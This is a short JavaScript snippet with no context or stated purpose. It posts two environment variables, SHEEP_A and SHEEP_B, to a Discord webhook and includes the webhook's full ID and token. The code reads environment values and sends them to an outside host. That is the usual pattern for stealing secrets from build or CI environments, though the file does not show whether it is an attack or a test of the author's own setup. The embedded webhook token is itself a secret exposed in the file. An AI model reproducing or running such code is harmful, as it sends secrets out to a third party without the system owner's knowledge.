fetch("https://discord.com/api/webhooks/1363440963548352572/AiXo1MaraWMm1XmdoR17Yyn8PwoLwTyXtXf22xg5E4cH2demaiHaPQGws-1sODzdZAje?wait=true", {
    "headers": {
        "Content-Type": "application/json",
    },
    "body": JSON.stringify({"content":"```\n" + process.env.SHEEP_A + "\n```\n" + "```\n" + process.env.SHEEP_B + "\n```\n","username":"test",}),
    "method": "POST",
});
